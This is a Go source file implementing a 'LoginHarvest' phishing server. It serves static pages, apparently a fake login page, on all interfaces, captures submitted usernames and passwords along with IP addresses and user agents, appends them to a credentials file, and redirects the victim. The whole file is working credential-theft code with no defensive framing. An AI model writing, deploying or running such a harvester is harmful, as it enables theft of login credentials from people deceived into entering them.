package http

import (
	"fmt"
	"net/http"
	"os"
	"time"

	"github.com/gorilla/mux"
	"github.com/sirupsen/logrus"
)

type LoginHarvest struct {
	FilePath       string
	Host           string
	CaptureURI     string
	ServerRootPath string
}

func NewLoginHarvest(filePath string, port int, captureUri string, serverRootPath string) *LoginHarvest {
	if filePath == "" {
		filePath = "credentials.txt"
	}

	if port < 0 {
		port = 8000
	}

	if captureUri == "" {
		captureUri = "/login"
	}

	if serverRootPath == "" {
		serverRootPath = "static"
	}

	host := fmt.Sprintf("0.0.0.0:%d", port)

	logFields := logrus.Fields{
		"CredentialsfilePath": filePath,
		"host":                host,
		"loginCaptureURI":     captureUri,
		"serverRootPath":      serverRootPath,
	}
	logrus.WithFields(logFields).Info("Login Harvesting Server has been initialized!")

	return &LoginHarvest{
		FilePath:       filePath,
		Host:           host,
		CaptureURI:     captureUri,
		ServerRootPath: serverRootPath,
	}
}

func (l *LoginHarvest) loginCatpure(w http.ResponseWriter, r *http.Request) {
	logFields := logrus.Fields{
		"time":       time.Now().String(),
		"username":   r.FormValue("username"),
		"password":   r.FormValue("password"),
		"userAgent":  r.Header.Get("User-Agent"),
		"ipAddress":  r.RemoteAddr,
		"httpMethod": r.Method,
	}
	logrus.WithFields(logFields).Info("Login Attempt Captured!!")

	if r.Method != http.MethodPost {
		fmt.Fprintf(w, "METHOD NOT ALLOWED")
		return
	}

	http.Redirect(w, r, "/", http.StatusMovedPermanently)
}

func (l *LoginHarvest) StartHarvesting() {
	fh, err := os.OpenFile(l.FilePath, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		logrus.Panicf("Failed to open/create file due to error: %s", err)
		return
	}
	defer fh.Close()
	logrus.SetOutput(fh)

	r := mux.NewRouter()
	r.HandleFunc(l.CaptureURI, l.loginCatpure)

	// expose file server on file server uri
	r.PathPrefix("/").Handler(http.FileServer(http.Dir(l.ServerRootPath)))

	// start server
	logrus.Fatal(http.ListenAndServe(l.Host, r))
}
